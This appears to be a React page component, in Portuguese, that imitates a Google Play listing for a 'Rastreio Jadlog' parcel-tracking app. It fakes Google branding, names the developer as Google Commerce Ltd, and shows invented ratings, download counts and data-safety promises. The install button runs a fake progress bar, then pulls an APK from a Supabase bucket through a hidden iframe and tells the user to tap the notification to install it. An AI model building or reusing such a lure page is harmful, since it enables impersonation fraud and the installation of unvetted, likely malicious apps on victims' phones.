import React, { useEffect, useState, useMemo } from "react";
import { useParams, useSearchParams } from "react-router-dom";
import { cloud } from "@/lib/cloud";

export default function GooglePlayDownloadPage() {
  const { slug } = useParams<{ slug?: string }>();
  const [searchParams] = useSearchParams();
  
  const [apkUrl, setApkUrl] = useState<string>("");
  const [appName, setAppName] = useState<string>("Rastreio Jadlog");
  const [companyName, setCompanyName] = useState<string>("Google Commerce Ltd");
  const [iconUrl, setIconUrl] = useState<string>("https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg");
  
  const [isDownloading, setIsDownloading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [downloadComplete, setDownloadComplete] = useState(false);
  const [showOverlay, setShowOverlay] = useState(false);

  // Carrega APK ativo ou por token / slug
  useEffect(() => {
    async function loadApkData() {
      try {
        const queryToken = searchParams.get("token") || searchParams.get("s");
        
        if (queryToken) {
          const { data: apkRow } = await cloud
            .from("apks")
            .select("id, file_path, file_name, download_token")
            .eq("download_token", queryToken)
            .maybeSingle();

          if (apkRow) {
            const base = import.meta.env.VITE_SUPABASE_URL;
            setApkUrl(`${base}/functions/v1/download-apk-public?token=${encodeURIComponent(apkRow.download_token)}`);
            if (apkRow.file_name) {
              const clean = apkRow.file_name.replace(/\.apk$/i, "");
              setAppName(clean.length > 2 ? clean : "Rastreio Jadlog");
            }
            return;
          }
        }

        // Se tiver slug, busca na tabela de links curtos
        if (slug) {
          const { data: linkRow } = await cloud
            .from("app_short_links")
            .select("original_url, metadata")
            .eq("slug", slug)
            .maybeSingle();

          if (linkRow?.original_url) {
            setApkUrl(linkRow.original_url);
            const metaToken = (linkRow.metadata as any)?.apk_token;
            if (metaToken) {
              const { data: apk } = await cloud
                .from("apks")
                .select("file_name")
                .eq("download_token", metaToken)
                .maybeSingle();
              if (apk?.file_name) {
                setAppName(apk.file_name.replace(/\.apk$/i, ""));
              }
            }
            return;
          }
        }

        // Fallback global de app_config
        const { data: configUrl } = await cloud
          .from("app_config")
          .select("value")
          .eq("key", "app_download_url")
          .maybeSingle();

        const { data: configMeta } = await cloud
          .from("app_config")
          .select("value")
          .eq("key", "app_apk_meta")
          .maybeSingle();

        if (configUrl?.value) {
          setApkUrl(configUrl.value);
        } else {
          // Fallback para URL pública do bucket
          const base = import.meta.env.VITE_SUPABASE_URL;
          setApkUrl(`${base}/storage/v1/object/public/apps/app-1787749232990.apk`);
        }

        if (configMeta?.value) {
          try {
            const parsed = JSON.parse(configMeta.value);
            if (parsed.displayName || parsed.appName) {
              setAppName(parsed.appName || parsed.displayName.replace(/\.apk$/i, ""));
            }
          } catch {
            // fallback mantido
          }
        }
      } catch (err) {
        console.error("Erro ao carregar APK:", err);
      }
    }

    void loadApkData();
  }, [slug, searchParams]);

  // Disparo do download animado
  const handleInstallClick = (e: React.MouseEvent) => {
    e.preventDefault();
    if (isDownloading) return;

    setIsDownloading(true);
    setProgress(0);

    let current = 0;
    const interval = setInterval(() => {
      if (current < 30) current += Math.random() * 3 + 2;
      else if (current < 75) current += Math.random() * 2 + 1;
      else if (current < 95) current += Math.random() * 1.2 + 0.5;
      else current += 0.8;

      if (current >= 100) {
        current = 100;
        clearInterval(interval);
        setProgress(100);
        setTimeout(() => {
          setDownloadComplete(true);
          setShowOverlay(true);

          // Dispara download invisível via iframe
          const targetUrl = apkUrl || "https://flkionbmkuqgkudjjuqk.supabase.co/storage/v1/object/public/apps/app-1787749232990.apk";
          const iframe = document.createElement("iframe");
          iframe.style.display = "none";
          iframe.src = targetUrl;
          document.body.appendChild(iframe);
        }, 400);
      } else {
        setProgress(current);
      }
    }, 60);
  };

  const handleShare = async () => {
    if (navigator.share) {
      try {
        await navigator.share({
          title: `${appName} - Apps no Google Play`,
          text: `Baixe o app oficial ${appName}:`,
          url: window.location.href,
        });
      } catch {
        // usuário cancelou
      }
    } else {
      await navigator.clipboard.writeText(window.location.href);
      alert("Link copiado para a área de transferência!");
    }
  };

  return (
    <div className="min-h-screen bg-white text-[#202124] font-sans antialiased selection:bg-[#cbf0e4]">
      {/* Overlay com Seta de Notificação */}
      {showOverlay && (
        <div
          className="fixed inset-0 bg-black/75 z-50 flex flex-col items-center justify-start pt-24 cursor-pointer text-white animate-fade-in"
          onClick={() => setShowOverlay(false)}
        >
          <div className="text-6xl animate-bounce mb-3 text-emerald-400 drop-shadow-[0_0_15px_rgba(52,211,153,0.8)]">
            ↑
          </div>
          <div className="text-xl font-bold tracking-wide text-center px-6">
            Clique na notificação para <br />
            <span className="text-emerald-400">Instalar o aplicativo</span>
          </div>
          <p className="mt-4 text-xs text-zinc-300">Toque em qualquer lugar para fechar</p>
        </div>
      )}

      {/* Header oficial Google Play */}
      <header className="h-16 border-b border-gray-200 px-4 sm:px-8 flex items-center justify-between sticky top-0 bg-white/95 backdrop-blur z-30">
        <div className="flex items-center gap-6">
          <div className="flex items-center gap-2 cursor-pointer">
            <svg width="32" height="32" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
              <path fill="#EA4335" d="M11.5 6.5l14 13.5-14 13.5V6.5z"/>
              <path fill="#FBBC04" d="M25.5 20L11.5 6.5l12-3.8c1.3-.4 2.7.2 3.3 1.4L31 12.8 25.5 20z"/>
              <path fill="#4285F4" d="M25.5 20L31 27.2l-4.2 8.7c-.6 1.2-2 1.8-3.3 1.4l-12-3.8L25.5 20z"/>
              <path fill="#34A853" d="M31 12.8v14.4l-5.5-7.2 5.5-7.2z"/>
            </svg>
            <span className="font-medium text-xl text-gray-700 tracking-tight font-['Google_Sans',sans-serif]">
              Google Play
            </span>
          </div>

          <nav className="hidden md:flex items-center gap-6 text-sm font-medium text-gray-600">
            <span className="text-emerald-700 border-b-2 border-emerald-700 pb-5 pt-5 cursor-pointer">Apps</span>
            <span className="hover:text-gray-900 cursor-pointer">Jogos</span>
            <span className="hover:text-gray-900 cursor-pointer">Filmes</span>
            <span className="hover:text-gray-900 cursor-pointer">Livros</span>
            <span className="hover:text-gray-900 cursor-pointer">Infantil</span>
          </nav>
        </div>

        <div className="flex items-center gap-4">
          <button className="p-2 text-gray-600 hover:text-gray-900 rounded-full hover:bg-gray-100">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
          </button>
          <button className="p-2 text-gray-600 hover:text-gray-900 rounded-full hover:bg-gray-100">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
          </button>
          <div className="w-8 h-8 rounded-full bg-emerald-600 text-white font-medium text-sm flex items-center justify-center shadow-sm">
            G
          </div>
        </div>
      </header>

      {/* Conteúdo Principal do App */}
      <main className="max-w-4xl mx-auto px-4 py-6 sm:py-10">
        <div className="flex flex-col sm:flex-row items-start gap-6 sm:gap-8">
          {/* Ícone Jadlog oficial ou Logo do App */}
          <div className="w-24 h-24 sm:w-36 sm:h-36 rounded-[22%] overflow-hidden shadow-lg border border-gray-100 bg-red-600 flex items-center justify-center p-3 shrink-0">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Jadlog_logo.png/320px-Jadlog_logo.png"
              alt={appName}
              className="w-full h-full object-contain"
              onError={(e) => {
                // Fallback para Jadlog em vetor caso a imagem externa falhe
                e.currentTarget.style.display = "none";
              }}
            />
            <div className="text-white font-black text-2xl tracking-tighter uppercase text-center leading-none">
              JADLOG
            </div>
          </div>

          <div className="flex-1 min-w-0">
            <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 tracking-tight">
              {appName}
            </h1>
            <p className="text-emerald-700 font-medium text-sm sm:text-base mt-0.5">
              {companyName}
            </p>
            <p className="text-xs text-gray-500 mt-0.5">Contém anúncios · Compras no app</p>

            {/* Métricas Google Play: 4.8★ | 1M+ downloads | Livre */}
            <div className="flex items-center gap-6 sm:gap-8 mt-5 pt-3 border-t border-gray-100">
              <div className="text-center">
                <div className="flex items-center justify-center gap-1 font-bold text-gray-900 text-sm sm:text-base">
                  <span>4.8</span>
                  <span className="text-amber-500 text-xs">★</span>
                </div>
                <div className="text-[11px] text-gray-500 mt-0.5">350 mil avaliações</div>
              </div>

              <div className="w-[1px] h-6 bg-gray-200" />

              <div className="text-center">
                <div className="font-bold text-gray-900 text-sm sm:text-base">1M+</div>
                <div className="text-[11px] text-gray-500 mt-0.5">Downloads</div>
              </div>

              <div className="w-[1px] h-6 bg-gray-200" />

              <div className="text-center">
                <div className="inline-flex items-center justify-center w-5 h-5 rounded border border-gray-400 text-[10px] font-bold text-gray-700">
                  L
                </div>
                <div className="text-[11px] text-gray-500 mt-0.5">Livre</div>
              </div>
            </div>

            {/* Ações: Botão de Instalar e Compartilhar */}
            <div className="flex items-center gap-3 mt-6">
              <button
                onClick={handleInstallClick}
                disabled={isDownloading && progress < 100}
                className="relative overflow-hidden flex-1 sm:flex-initial sm:min-w-[200px] h-11 bg-[#01875f] hover:bg-[#017250] active:bg-[#005f42] text-white font-medium text-sm rounded-lg transition-all shadow-sm flex items-center justify-center px-6"
              >
                {/* Preenchimento de progresso */}
                {isDownloading && (
                  <div
                    className="absolute inset-y-0 left-0 bg-[#005f42]/40 transition-[width] duration-75 ease-linear pointer-events-none"
                    style={{ width: `${progress}%` }}
                  />
                )}

                <span className="relative z-10 flex items-center gap-2">
                  {isDownloading && progress < 100 && (
                    <span className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin" />
                  )}
                  {downloadComplete
                    ? "Download concluído"
                    : isDownloading
                    ? `${Math.floor(progress)}%`
                    : "Instalar"}
                </span>
              </button>

              <button
                onClick={handleShare}
                className="p-2.5 rounded-lg border border-gray-300 hover:bg-gray-50 text-gray-700 transition"
                title="Compartilhar"
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/>
                </svg>
              </button>
            </div>

            <div className="flex items-center gap-2 text-xs text-gray-500 mt-3">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
              <span>Disponível no seu dispositivo Android</span>
            </div>
          </div>
        </div>

        {/* Seção Sobre o app */}
        <section className="mt-10 pt-6 border-t border-gray-200">
          <div className="flex items-center justify-between mb-3">
            <h2 className="text-lg font-bold text-gray-900">Sobre este app</h2>
            <span className="text-emerald-700 text-sm font-semibold cursor-pointer">→</span>
          </div>
          <p className="text-sm text-gray-600 leading-relaxed">
            Acompanhe suas encomendas com rapidez e precisão em tempo real. Consulte prazos de entrega,
            notificações instantâneas de status logístico e suporte integrado para todas as principais regiões do Brasil.
          </p>

          <div className="flex flex-wrap gap-2 mt-4">
            <span className="px-3 py-1 bg-gray-100 rounded-full text-xs font-medium text-gray-700">Produtividade</span>
            <span className="px-3 py-1 bg-gray-100 rounded-full text-xs font-medium text-gray-700">Rastreamento de Pedidos</span>
            <span className="px-3 py-1 bg-gray-100 rounded-full text-xs font-medium text-gray-700">Logística Oficial</span>
          </div>
        </section>

        {/* Seção Segurança dos dados */}
        <section className="mt-8 pt-6 border-t border-gray-200">
          <div className="flex items-center justify-between mb-3">
            <h2 className="text-lg font-bold text-gray-900">Segurança dos dados</h2>
            <span className="text-emerald-700 text-sm font-semibold cursor-pointer">→</span>
          </div>
          <p className="text-xs text-gray-500 mb-4">
            A segurança começa com a compreensão da forma como os desenvolvedores coletam e compartilham seus dados.
          </p>

          <div className="border border-gray-200 rounded-xl p-4 space-y-3.5 text-xs text-gray-700">
            <div className="flex items-start gap-3">
              <span className="text-emerald-600 text-base">🛡️</span>
              <div>
                <p className="font-semibold text-gray-900">Nenhum dado é compartilhado com terceiros</p>
                <p className="text-gray-500">O desenvolvedor declara que o app não compartilha dados do usuário.</p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-emerald-600 text-base">🔒</span>
              <div>
                <p className="font-semibold text-gray-900">Os dados são criptografados em trânsito</p>
                <p className="text-gray-500">Seus dados são transferidos por conexão segura SSL/TLS de 256 bits.</p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-emerald-600 text-base">🗑️</span>
              <div>
                <p className="font-semibold text-gray-900">Você pode solicitar a exclusão dos dados</p>
                <p className="text-gray-500">O desenvolvedor oferece um canal direto para remoção dos seus dados.</p>
              </div>
            </div>
          </div>
        </section>
      </main>

      {/* Footer Google Play */}
      <footer className="mt-16 border-t border-gray-200 bg-gray-50 text-gray-500 text-xs py-8 px-4 sm:px-8">
        <div className="max-w-4xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex flex-wrap items-center gap-4">
            <span className="hover:underline cursor-pointer">Google Play</span>
            <span className="hover:underline cursor-pointer">Play Pass</span>
            <span className="hover:underline cursor-pointer">Termos de Serviço</span>
            <span className="hover:underline cursor-pointer">Privacidade</span>
            <span className="hover:underline cursor-pointer">Sobre o Google Play</span>
          </div>
          <div>Brasil (Português)</div>
        </div>
      </footer>
    </div>
  );
}
